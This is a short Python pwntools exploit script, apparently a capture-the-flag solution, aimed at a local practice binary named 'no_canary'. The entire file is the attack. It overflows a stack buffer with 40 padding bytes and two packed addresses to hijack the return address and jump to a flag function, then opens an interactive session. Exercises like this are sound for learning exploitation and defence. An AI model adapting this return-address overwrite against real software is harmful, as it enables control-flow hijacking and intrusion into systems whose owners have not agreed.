from pwn import *

FLAG_ADDRESS = 0x0000000000401186
FLAG_RETURN_ADDRESS = 0x0000000000401198

p = process("./no_canary")
#attach(p)

p.recvuntil("What's your name?")


payload = 'A'*40
payload += p64(FLAG_RETURN_ADDRESS)
payload += p64(FLAG_ADDRESS)

p.sendline(payload)

p.interactive()